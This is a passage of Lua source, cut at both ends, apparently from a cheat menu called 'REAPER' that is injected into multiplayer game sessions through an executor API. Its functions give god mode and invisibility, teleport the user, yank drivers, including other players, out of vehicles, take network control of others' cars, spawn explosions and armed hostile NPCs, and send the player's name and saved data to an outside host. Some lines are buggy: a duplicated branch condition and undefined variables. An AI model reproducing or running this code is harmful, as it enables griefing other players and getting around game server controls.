                    if __REAPER1__.A['vehicle:movement_nextra'].sindex == 2 then
                        __REAPER1__.N.SecureInvisible(__REAPER1__.V.CurrentVehicle, p2)
                    elseif __REAPER1__.A['vehicle:movement_nextra'].sindex == 2 then
                        __REAPER1__.N.ReaperGod(__REAPER1__.V.CurrentVehicle, 69101.120, not p2)
                    elseif __REAPER1__.A['vehicle:movement_nextra'].sindex == 4 then
                        __REAPER1__.N.SecureInvisible(__REAPER1__.V.CurrentVehicle, p2)
                        __REAPER1__.N.ReaperGod(__REAPER1__.V.CurrentVehicle, 69101.120, not p2)
                    end
                end,
                extra = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.A['vehicle:movement_noclip'].func then
                        if p4 == 2 then
                            __REAPER1__.N.SecureInvisible(__REAPER1__.V.CurrentVehicle, true)
                        elseif p4 == 4 then
                            __REAPER1__.N.SecureInvisible(__REAPER1__.V.CurrentVehicle, true)
                        elseif p4 == 1 then
                            __REAPER1__.N.SecureInvisible(__REAPER1__.V.CurrentVehicle, false)
                        end
                    end
                end,
                lagging = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.V.VehNoclipTimer = __REAPER1__.N.GetGameTimer()
                end,
            },
            handling = {
                handling = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleHandlingFloat(__REAPER1__.V.CurrentVehicle, 'CHandlingData', p6, tonumber(p2))
                end,
            },
            doors = {
                openalldoors = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleDoorOpen(__REAPER1__.V.CurrentVehicle, 0, false, false)
                    __REAPER1__.N.SetVehicleDoorOpen(__REAPER1__.V.CurrentVehicle, 1, false, false)
                    __REAPER1__.N.SetVehicleDoorOpen(__REAPER1__.V.CurrentVehicle, 2, false, false)
                    __REAPER1__.N.SetVehicleDoorOpen(__REAPER1__.V.CurrentVehicle, 3, false, false)
                    __REAPER1__.N.SetVehicleDoorOpen(__REAPER1__.V.CurrentVehicle, 4, false, false)
                    __REAPER1__.N.SetVehicleDoorOpen(__REAPER1__.V.CurrentVehicle, 5, false, false)
                    __REAPER1__.N.SetVehicleDoorOpen(__REAPER1__.V.CurrentVehicle, 6, false, false)
                    __REAPER1__.N.SetVehicleDoorOpen(__REAPER1__.V.CurrentVehicle, 7, false, false)
                end,
                closealldoors = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleDoorsShut(__REAPER1__.V.CurrentVehicle, false)
                end,
                togglelock = function(p1, p2, p3, p4, p5, p6, p7)
                    local lock = __REAPER1__.N.GetVehicleDoorLockStatus(__REAPER1__.V.CurrentVehicle)
                    if lock == 0 or lock == 1 then
                        __REAPER1__.N.OpDoorLock(__REAPER1__.V.CurrentVehicle, 2)
                    elseif lock == 2 then
                        __REAPER1__.N.OpDoorLock(__REAPER1__.V.CurrentVehicle, 1)
                    end
                end,
                opendoor = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleDoorOpen(__REAPER1__.V.CurrentVehicle, p4 - 1, false, false)
                end,
                closedoor = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleDoorShut(__REAPER1__.V.CurrentVehicle, p4 - 1, false)
                end,
                deletedoor = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.N.SetVehicleDoorBroken(__REAPER1__.V.CurrentVehicle, p4 - 1, true)
                end,
            },
            ramps = {
                attach = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.CurrentVehicle ~= 0 then
                        if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.VehicleRamp) then
                            __REAPER1__.N.DeleteEntity(__REAPER1__.V.VehicleRamp)
                        end
    
                        __REAPER25__(function()
                            local hash = __REAPER1__.N.GetHashKey(__REAPER1__.T.VehRamps[__REAPER1__.A['vehicle:ramps_ramptype'].sindex])
                            if __REAPER1__.F.RequestEntity(hash) then
                                __REAPER1__.V.VehicleRamp = __REAPER1__.N.CreateObject(hash, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.CurrentVehicle), true, true, false)
    
                                local off1, off2, off3 = __REAPER1__.F.AdvStringSplit(3, __REAPER1__.A['vehicle:ramps_offset'].func, ' ', true)
                                __REAPER1__.N.AttachEntityToEntity(__REAPER1__.V.VehicleRamp, __REAPER1__.V.CurrentVehicle, __REAPER1__.N.GetEntityBoneIndexByName(__REAPER1__.V.CurrentVehicle, __REAPER1__.A['vehicle:ramps_vehiclepart'].func[__REAPER1__.A['vehicle:ramps_vehiclepart'].sindex]), off1, off2, off3, 0, 0, __REAPER1__.F.IntToFloat(__REAPER1__.A['vehicle:ramps_rotation'].sindex - 1), true, false, true, false, 0, true)
                                __REAPER1__.N.SetEntityVisible(__REAPER1__.V.VehicleRamp, not __REAPER1__.A['vehicle:ramps_invisible'].func, 0)
                            end
                        end)
                    end
                end,
                delete = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.VehicleRamp) then
                        __REAPER1__.N.DeleteEntity(__REAPER1__.V.VehicleRamp)
                    end
                end,
                offset = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.VehicleRamp) then
                        __REAPER1__.F.AddNotification('Need to attach again to apply changes.', 4000, 210, 210, 0)
                    end
                end,
                rotation = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.VehicleRamp) then
                        __REAPER1__.F.AddNotification('Need to attach again to apply changes.', 4000, 210, 210, 0)
                    end
                end,
                invisible = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.VehicleRamp) then
                        __REAPER1__.N.SetEntityVisible(__REAPER1__.V.VehicleRamp, not p2, 0)
                    end
                end,
            },
        },
        server = {
            safespace = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.N.SafeCam(p2)
            end
        },
        teleport = {
            tptowaypoint = function(p1, p2, p3, p4, p5, p6, p7)
                local waypoint = __REAPER1__.N.GetFirstBlipInfoId(8)
                if __REAPER1__.N.DoesBlipExist(waypoint) then
                    __REAPER25__(function()
                        local coords = __REAPER1__.N.GetBlipInfoIdCoord(waypoint)

                        __REAPER1__.N.RequestCollisionAtCoord(coords.x, coords.y, z)
                        __REAPER1__.N.SetFocusEntity(__REAPER1__.V.SelfPed)

                        for i = 1, 1000 do
                            __REAPER26__(5)
                            local ground, z = __REAPER1__.N.GetGroundZFor_3dCoord(coords.x, coords.y, i + 0.0)

                            if __REAPER1__.A['teleport_keepvehicle'].func then
                                __REAPER1__.N.SetPedCoordsKeepVehicle(__REAPER1__.V.SelfPed, coords.x, coords.y, i + 0.0)
                            else
                                __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.SelfPed, coords.x, coords.y, i + 0.0, true, true, true)
                            end

                            if ground then break end
                        end
                    end)
                else
                    __REAPER1__.F.AddNotification('Waypoint not set.', 3000, 210, 210, 0)
                end
            end,
            tptocoords = function(p1, p2, p3, p4, p5, p6, p7)
                local x, y, z = __REAPER1__.F.AdvStringSplit(3, p2, ' ', true)
                __REAPER1__.N.RequestCollisionAtCoord(x, y, z)
                if __REAPER1__.A['teleport_keepvehicle'].func then
                    __REAPER1__.N.SetPedCoordsKeepVehicle(__REAPER1__.V.SelfPed, x, y, z)
                else
                    __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.SelfPed, x, y, z, true, true, true)
                end

                __REAPER1__.N.SetFocusEntity(__REAPER1__.V.SelfPed)
            end,
            dnearestcar = function(p1, p2, p3, p4, p5, p6, p7)
                local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                if __REAPER1__.N.IsAnyVehicleNearPoint(coords, 100000000.0) then
                    local closestVehToMe = __REAPER1__.N.GetClosestVehicle(coords, 100000000.0, 0, 71)
                    local driver = __REAPER1__.N.GetPedInVehicleSeat(closestVehToMe, -1)
                    if __REAPER1__.A['teleport_onlynpc'].func and not __REAPER1__.N.IsPedAPlayer(driver) or not __REAPER1__.A['teleport_onlynpc'].func then
                        if driver then
                            __REAPER1__.N.ClearPedTasksImmediately(driver, 0.0)
                        end
                        __REAPER1__.N.SetPedIntoVehicle(__REAPER1__.V.SelfPed, closestVehToMe, -1)
                    end
                end
            end,
            nearestcar = function(p1, p2, p3, p4, p5, p6, p7)
                local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                if __REAPER1__.N.IsAnyVehicleNearPoint(coords, 100000000.0) then
                    local closestVehToMe = __REAPER1__.N.GetClosestVehicle(coords, 100000000.0, 0, 71)
                    local driver = __REAPER1__.N.GetPedInVehicleSeat(closestVehToMe, -1)
                    if __REAPER1__.A['teleport_onlynpc'].func and not __REAPER1__.N.IsPedAPlayer(driver) or not __REAPER1__.A['teleport_onlynpc'].func then
                        __REAPER1__.N.SetPedIntoVehicle(__REAPER1__.V.SelfPed, closestVehToMe, -2)
                    end
                end
            end,
            tnearestcar = function(p1, p2, p3, p4, p5, p6, p7)
                local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                if __REAPER1__.N.IsAnyVehicleNearPoint(coords, 100000000.0) then
                    local closestVehToMe = __REAPER1__.N.GetClosestVehicle(coords, 100000000.0, 0, 71)
                    local driver = __REAPER1__.N.GetPedInVehicleSeat(closestVehToMe, -1)
                    if __REAPER1__.A['teleport_onlynpc'].func and not __REAPER1__.N.IsPedAPlayer(driver) or not __REAPER1__.A['teleport_onlynpc'].func then
                        __REAPER25__(function()
                            if __REAPER1__.F.NetControl(closestVehToMe) then
                                __REAPER1__.N.SetEntityCoordsNoOffset(closestVehToMe, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), false, false, false)
                            end
                        end)
                    end
                end
            end,
            lastvehicle = function(p1, p2, p3, p4, p5, p6, p7)
                local closestVehToMe = __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed, true)
                local driver = __REAPER1__.N.GetPedInVehicleSeat(closestVehToMe, -1)
                if __REAPER1__.A['teleport_onlynpc'].func and not __REAPER1__.N.IsPedAPlayer(driver) or not __REAPER1__.A['teleport_onlynpc'].func then
                    __REAPER1__.N.SetPedIntoVehicle(__REAPER1__.V.SelfPed, closestVehToMe, -2)
                end
            end,
            tlastvehicle = function(p1, p2, p3, p4, p5, p6, p7)
                local closestVehToMe = __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed, true)
                local driver = __REAPER1__.N.GetPedInVehicleSeat(closestVehToMe, -1)
                if __REAPER1__.A['teleport_onlynpc'].func and not __REAPER1__.N.IsPedAPlayer(driver) or not __REAPER1__.A['teleport_onlynpc'].func then
                    __REAPER25__(function()
                        if __REAPER1__.F.NetControl(closestVehToMe) then
                            __REAPER1__.N.SetEntityCoordsNoOffset(closestVehToMe, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), false, false, false)
                        end
                    end)
                end
            end,
            tptolocation = function(p1, p2, p3, p4, p5, p6, p7)
                local x, y, z = p6.x, p6.y, p6.z
                __REAPER1__.N.RequestCollisionAtCoord(x, y, z)
                if __REAPER1__.A['teleport_keepvehicle'].func then
                    __REAPER1__.N.SetPedCoordsKeepVehicle(__REAPER1__.V.SelfPed, x, y, z)
                else
                    __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.SelfPed, x, y, z, true, true, true)
                end

                __REAPER1__.N.SetFocusEntity(__REAPER1__.V.SelfPed)
            end,
            direction = function(p1, p2, p3, p4, p5, p6, p7)
                local x, y, z  = nil, nil, nil
                if p6 == 'up' then
                    local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    x, y, z = coords.x, coords.y, coords.z +  __REAPER1__.F.IntToFloat(__REAPER1__.A['teleport_distance'].sindex)
                elseif p6 == 'down' then
                    local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    x, y, z = coords.x, coords.y, coords.z -  __REAPER1__.F.IntToFloat(__REAPER1__.A['teleport_distance'].sindex)
                elseif p6 == 'forward' then
                    x, y, z = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.SelfPed, 0, __REAPER1__.F.IntToFloat(__REAPER1__.A['teleport_distance'].sindex), 0)
                elseif p6 == 'backward' then
                    x, y, z = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.SelfPed, 0, - __REAPER1__.F.IntToFloat(__REAPER1__.A['teleport_distance'].sindex), 0)
                elseif p6 == 'left' then
                    x, y, z = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.SelfPed, - __REAPER1__.F.IntToFloat(__REAPER1__.A['teleport_distance'].sindex), 0, 0)
                elseif p6 == 'right' then
                    x, y, z = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.SelfPed, __REAPER1__.F.IntToFloat(__REAPER1__.A['teleport_distance'].sindex), 0, 0)
                end

                if __REAPER1__.A['teleport_keepvehicle'].func then
                    __REAPER1__.N.SetPedCoordsKeepVehicle(__REAPER1__.V.SelfPed, x, y, z)
                else
                    __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.SelfPed, x, y, z, true, true, true)
                end
            end,
            saved = {
                save = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        local ret = __REAPER1__.F.TextBox('', nil, 'altalanos', 'vegyes', 30, 'Teleport location name')
                        if ret then
                            local t = json.decode(Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&cfg=]]..'::stuff::hju456j'..[[&val=&append=]], 'host19.phl.hu', 443, true))
                            local location = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                
                            if t ~= nil then
                                if not t['t'] then t['t'] = {} end
                                t['t'][ret] = location
                                __REAPER1__.F.WebSave('::stuff::hju456j', t, 5000)
                            else
                                local t = {['t'] = {[ret] = location}}
                                Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&append=]]..[[&cfg=]]..'::stuff::hju456j'..[[&val=]]..json.encode(t), 'host19.phl.hu', 443, true)
                            end

                            if __REAPER1__.T.Display['teleport:savedlocations'][2] == nil then
                                __REAPER1__.T.Display['teleport:savedlocations'][2] = {text = 'Locations', option = __REAPER1__.M.Separator}
                                local dkey = 'teleport:savedlocations' .. ret .. 3
                                local t = {text = ret, dkey = dkey, desc = ret .. ' teleport location menu.', option = __REAPER1__.M.Menu_Button, func = {'teleport:savedlocations', dkey}, lasto = 1, scrollo = 0, addedo = 0}
                                __REAPER1__.T.Display['teleport:savedlocations'][3] = t
                                __REAPER1__.A[dkey] = t
                                
                                __REAPER1__.T.Display[dkey] = {
                                    {text = 'Teleport', dkey = dkey .. '_set', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.saved.load, option = __REAPER1__.M.Button, extra = dkey},
                                    {text = 'Delete', dkey = dkey .. '_delete', desc = 'Delete this teleport location', afu = __REAPER1__.M.teleport.saved.delete, option = __REAPER1__.M.Button, extra = dkey},
                                }
                            else
                                local dkey = 'teleport:savedlocations' .. ret .. #__REAPER1__.T.Display['teleport:savedlocations']
                                local t = {text = ret, dkey = dkey, desc = ret .. ' teleport location menu.', option = __REAPER1__.M.Menu_Button, func = {'teleport:savedlocations', dkey}, lasto = 1, scrollo = 0, addedo = 0}
                                table.insert(__REAPER1__.T.Display['teleport:savedlocations'], t)
                                __REAPER1__.A[dkey] = t
                                
                                __REAPER1__.T.Display[dkey] = {
                                    {text = 'Teleport', dkey = dkey .. '_set', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.saved.load, option = __REAPER1__.M.Button, extra = dkey},
                                    {text = 'Delete', dkey = dkey .. '_delete', desc = 'Delete this teleport location', afu = __REAPER1__.M.teleport.saved.delete, option = __REAPER1__.M.Button, extra = dkey},
                                }
                            end

                            __REAPER1__.F.AddNotification('Saved location: ' .. ret, 5000, 0, 170, 10)
                        end
                    end)
                end,
                load = function(p1, p2, p3, p4, p5, p6, p7)
                    local text = __REAPER1__.A[p6].text
                    local t = json.decode(Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&cfg=]]..'::stuff::hju456j'..[[&val=&append=]], 'host19.phl.hu', 443, true))
                
                    __REAPER1__.M.teleport.tptolocation(nil, nil, nil, nil, nil, t['t'][text])
                    __REAPER1__.F.AddNotification('Teleported to: ' .. text, 5000, 0, 170, 10)
                end,
                delete = function(p1, p2, p3, p4, p5, p6, p7)
                    local text = __REAPER1__.A[p6].text
                    local t = json.decode(Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&cfg=]]..'::stuff::hju456j'..[[&val=&append=]], 'host19.phl.hu', 443, true))
                    
                    t['t'][text] = nil
                    Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..Ham.getName()..[[&append=]]..[[&cfg=]]..'::stuff::hju456j'..[[&val=]]..json.encode(t), 'host19.phl.hu', 443, true)

                    __REAPER1__.F.DeleteConfigTab('vehicle:savedlocations', p6, 3)
                    __REAPER1__.F.AddNotification('Deleted location: ' .. teleport, 5000, 0, 170, 10)
                end,
            },
        },
        spawning = {
            delete = function(p1, p2, p3, p4, p5, p6, p7)
                for k,v in ipairs(__REAPER1__.T.SpawningObjectList) do
                    __REAPER1__.N.DeleteEntity(v.o, v.n)
                end
                __REAPER1__.T.SpawningObjectList = {}
                for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                    __REAPER1__.N.DeleteEntity(v.p, v.n)
                end
                __REAPER1__.T.SpawningPedList = {}
                for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                    __REAPER1__.N.DeleteEntity(v.v, v.n)
                end
                __REAPER1__.T.SpawningVehicleList = {}
            end,
            bring = function(p1, p2, p3, p4, p5, p6, p7)
                for k,v in ipairs(__REAPER1__.T.SpawningObjectList) do
                    __REAPER1__.N.SetEntityCoordsNoOffset(v.o, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), true, true, true)
                end
                for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                    __REAPER1__.N.SetEntityCoordsNoOffset(v.p, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), true, true, true)
                end
                for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                    __REAPER1__.N.SetEntityCoordsNoOffset(v.v, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), true, true, true)
                end
            end,
            gotolast = function(p1, p2, p3, p4, p5, p6, p7)
                if p4 == 1 and __REAPER1__.T.SpawningObjectList[1] then
                    __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.SelfPed, __REAPER1__.N.GetEntityCoords(__REAPER1__.T.SpawningObjectList[#__REAPER1__.T.SpawningObjectList].o), true, true, true)
                elseif p4 == 2 and __REAPER1__.T.SpawningPedList[1] then
                    __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.SelfPed, __REAPER1__.N.GetEntityCoords(__REAPER1__.T.SpawningPedList[#__REAPER1__.T.SpawningPedList].p), true, true, true)
                elseif __REAPER1__.T.SpawningVehicleList[1] then
                    __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.SelfPed, __REAPER1__.N.GetEntityCoords(__REAPER1__.T.SpawningVehicleList[#__REAPER1__.T.SpawningVehicleList].v), true, true, true)
                end
            end,
            explode = function(p1, p2, p3, p4, p5, p6, p7)
                for k,v in ipairs(__REAPER1__.T.SpawningObjectList) do
                    __REAPER1__.N.CreateExplosion(__REAPER1__.N.GetEntityCoords(v.o), 7, 9999.0, true, false, true)
                end
                for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                    __REAPER1__.N.CreateExplosion(__REAPER1__.N.GetEntityCoords(v.p), 7, 9999.0, true, false, true)
                end
                for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                    __REAPER1__.N.CreateExplosion(__REAPER1__.N.GetEntityCoords(v.v), 7, 9999.0, true, false, true)
                end
            end,
            launch = function(p1, p2, p3, p4, p5, p6, p7)
                for k,v in ipairs(__REAPER1__.T.SpawningObjectList) do
                    __REAPER1__.N.ApplyForceToEntity(v.o, 1, 9500.0, 3.0, 7100.0, 1.0, 0.0, 0.0, 1, false, true, false, false)
                end
                for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                    __REAPER1__.N.ApplyForceToEntity(v.p, 1, 9500.0, 3.0, 7100.0, 1.0, 0.0, 0.0, 1, false, true, false, false)
                end
                for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                    __REAPER1__.N.ApplyForceToEntity(v.v, 1, 0, 0, 7100.0, 1.0, 0.0, 0.0, 1, false, true, false, false)
                end
            end,
            togglegod = function(p1, p2, p3, p4, p5, p6, p7)
                for k,v in ipairs(__REAPER1__.T.SpawningObjectList) do
                    __REAPER1__.N.SetEntityVisible(v.o, not __REAPER1__.N.IsEntityVisible(v.o))
                end
                for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                    __REAPER1__.N.SetEntityVisible(v.p, not __REAPER1__.N.IsEntityVisible(v.p))
                end
                for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                    __REAPER1__.N.SetEntityVisible(v.v, not __REAPER1__.N.IsEntityVisible(v.v))
                end
            end,
            togglevis = function(p1, p2, p3, p4, p5, p6, p7)
                for k,v in ipairs(__REAPER1__.T.SpawningObjectList) do
                    __REAPER1__.N.SetEntityVisible(v.o, not __REAPER1__.N.IsEntityVisible(v.o))
                end
                for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                    __REAPER1__.N.SetEntityVisible(v.p, not __REAPER1__.N.IsEntityVisible(v.p))
                end
                for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                    __REAPER1__.N.SetEntityVisible(v.v, not __REAPER1__.N.IsEntityVisible(v.v))
                end
            end,
            freeze = function(p1, p2, p3, p4, p5, p6, p7)
                for k,v in ipairs(__REAPER1__.T.SpawningObjectList) do
                    __REAPER1__.N.FreezeEntityPosition(v.o, p2)
                end
                for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                    __REAPER1__.N.FreezeEntityPosition(v.p, p2)
                end
                for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                    __REAPER1__.N.FreezeEntityPosition(v.v, p2)
                end
            end,
            blip = function(p1, p2, p3, p4, p5, p6, p7)
                if p2 then
                    __REAPER1__.V.SpawningBlipLoop = true
                else
                    for k,v in ipairs(__REAPER1__.T.SpawningBlips) do
                        __REAPER1__.N.RemoveBlip(v.blip)
                    end
                    __REAPER1__.T.SpawningBlips = {}
                end
            end,
            refreshblip = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER1__.V.SpawningBlipLoop = true
            end,
            particle = function(p1, p2, p3, p4, p5, p6, p7)
                local type, scale = __REAPER1__.T.ParticleEffects[__REAPER1__.A['spawning_type'].sindex], __REAPER1__.F.IntToFloat(__REAPER1__.A['spawning_scale'].sindex - 1) / 10
                for k,v in ipairs(__REAPER1__.T.SpawningObjectList) do
                    local coords = __REAPER1__.N.GetEntityCoords(v.o)
                    __REAPER1__.N.DoParticle(type.dict, type.name, coords.x, coords.y, coords.z, scale, 0, 0, 0, 0, 0, 0)
                end
                for k,v in ipairs(__REAPER1__.T.SpawningPedList) do
                    local coords = __REAPER1__.N.GetEntityCoords(v.p)
                    __REAPER1__.N.DoParticle(type.dict, type.name, coords.x, coords.y, coords.z, scale, 0, 0, 0, 0, 0, 0)
                end
                for k,v in ipairs(__REAPER1__.T.SpawningVehicleList) do
                    local coords = __REAPER1__.N.GetEntityCoords(v.v)
                    __REAPER1__.N.DoParticle(type.dict, type.name, coords.x, coords.y, coords.z, scale, 0, 0, 0, 0, 0, 0)
                end
            end,
            objectspawner = {
                spawn = function(p1, p2, p3, p4, p5, p6, p7)
                    local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    if __REAPER1__.A['spawning:objectspawner_coords'].func ~= 'None' then
                        coords = vector3(__REAPER1__.F.AdvStringSplit(3, __REAPER1__.A['spawning:objectspawner_coords'].func, ' ', true))
                    end
    
                    local hash = __REAPER1__.N.GetHashKey(p4 and __REAPER1__.T.SpawningObjects[p4] or p2)
                    __REAPER25__(function()
                        if __REAPER1__.F.RequestEntity(hash) then
                            local obj = __REAPER1__.N.CreateObject(hash, coords, __REAPER1__.A['spawning:objectspawner_networked'].func, __REAPER1__.A['spawning:objectspawner_missionentity'].func, __REAPER1__.A['spawning:objectspawner_dynamic'].func)
                            table.insert(__REAPER1__.T.SpawningObjectList, {o = obj, n = not __REAPER1__.A['spawning:objectspawner_networked'].func})
                            __REAPER1__.N.SetEntityVisible(obj, not __REAPER1__.A['spawning:objectspawner_invisible'].func)
                            __REAPER1__.N.SetEntityInvincible(obj, __REAPER1__.A['spawning:objectspawner_godmode'].func)

                            __REAPER1__.V.SpawningBlipLoop = true
                        end
                    end)
                end,
                delete = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningObjectList) do
                        __REAPER1__.N.DeleteEntity(v.o, v.n)
                    end
                    __REAPER1__.T.SpawningObjectList = {}
                end,
                deletelast = function(p1, p2, p3, p4, p5, p6, p7)
                    local obj = #__REAPER1__.T.SpawningObjectList
                    if obj ~= 0 then
                        __REAPER1__.N.DeleteEntity(__REAPER1__.T.SpawningObjectList[obj].o, __REAPER1__.T.SpawningObjectList[obj].n)
                        table.remove(__REAPER1__.T.SpawningObjectList, obj)
                    else
                        __REAPER1__.F.AddNotification('No spawned objects.', 3000, 210, 210, 0)
                    end
                end,
                togglevis = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningObjectList) do
                        __REAPER1__.N.SetEntityVisible(v.o, not __REAPER1__.N.IsEntityVisible(v.o))
                    end
                end,
                togglegod = function(p1, p2, p3, p4, p5, p6, p7)
                    for k,v in ipairs(__REAPER1__.T.SpawningObjectList) do
                        __REAPER1__.N.SetEntityInvincible(v.o, __REAPER1__.N.GetEntityCanBeDamaged(v.o))
                    end
                end,
            },
            pedspawner = {
                spawn = function(p1, p2, p3, p4, p5, p6, p7)
                    local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    local heading = __REAPER1__.N.GetEntityHeading(__REAPER1__.V.SelfPed)
                    if __REAPER1__.A['spawning:pedspawner_coords'].func ~= 'None' then
                        coords = vector3(__REAPER1__.F.AdvStringSplit(3, __REAPER1__.A['spawning:pedspawner_coords'].func, ' ', true))
                    end
                    if __REAPER1__.A['spawning:pedspawner_heading'].sindex ~= 1 then
                        heading = __REAPER1__.F.IntToFloat(__REAPER1__.A['spawning:pedspawner_heading'].sindex - 2)
                    end
    
                    local ped = p4 and __REAPER1__.T.SpawningPeds[p4] or p2
                    local hash = __REAPER1__.N.GetHashKey(ped)
    
                    __REAPER25__(function()
                        if __REAPER1__.F.RequestEntity(hash) then
                            local ped = __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType(ped), hash, coords, heading, __REAPER1__.A['spawning:pedspawner_networked'].func, __REAPER1__.A['spawning:pedspawner_missionentity'].func)
                            table.insert(__REAPER1__.T.SpawningPedList, {p = ped, n = not __REAPER1__.A['spawning:pedspawner_networked'].func})
        
                            if __REAPER1__.A['spawning:pedspawner_weapon'].toggle then
                                __REAPER1__.N.GiveWeaponToPed(ped, __REAPER1__.N.GetHashKey('weapon_' .. __REAPER1__.A['spawning:pedspawner_weapon'].func[__REAPER1__.A['spawning:pedspawner_weapon'].sindex]), 9999999, false, true)
                            end

                            if __REAPER1__.A['spawning:pedspawner_condition'].toggle then
                                if __REAPER1__.A['spawning:pedspawner_condition'].sindex == 1 then
                                    __REAPER1__.N.SetPedAngry(ped)
                                elseif __REAPER1__.A['spawning:pedspawner_condition'].sindex == 2 then
                                    __REAPER1__.N.SetPedHearingRange(ped, 0.0)
                                elseif __REAPER1__.A['spawning:pedspawner_condition'].sindex == 3 then
                                    __REAPER1__.N.SetPedSeeingRange(ped, 0.0)
                                elseif __REAPER1__.A['spawning:pedspawner_condition'].sindex == 4 then
                                    __REAPER1__.N.SetPedHearingRange(ped, 0.0)
                                    __REAPER1__.N.SetPedSeeingRange(ped, 0.0)
                                end
                            end

                            if __REAPER1__.A['spawning:pedspawner_randomclothing'].func then
                                __REAPER1__.N.SetPedRandomComponentVariation(ped)
                            end

                            if __REAPER1__.A['spawning:pedspawner_animation'].toggle then
                                __REAPER25__(function()
                                    local anim = __REAPER1__.T.SpawningPedAnims[__REAPER1__.A['spawning:pedspawner_animation'].sindex]
                                    if __REAPER1__.F.RequestAnimDict(anim.dict) then
                                        if __REAPER1__.A['spawning:pedspawner_animation'].sindex == 5 then
                                            while __REAPER1__.N.DoesEntityExist(ped) and not __REAPER1__.N.IsEntityDead(ped) and not __REAPER1__.V.SpawningPedsPoint do
                                                __REAPER26__(0)
                                                if not __REAPER1__.N.IsTaskMoveNetworkActive(ped) then
                                                    __REAPER1__.N.TaskMoveNetworkByName(ped, anim.name, 0.5, 0, anim.dict, 24)
                                                end
        
                                                __REAPER1__.N.SetTaskMoveNetworkSignalFloat(ped, "Pitch", 0.4)
                                                __REAPER1__.N.SetTaskMoveNetworkSignalFloat(ped, "Heading", 0.5)
                                                __REAPER1__.N.SetTaskMoveNetworkSignalBool(ped, "isBlocked", false)
                                                __REAPER1__.N.SetTaskMoveNetworkSignalBool(ped, "isFirstPerson", false)
                                            end
                                        else
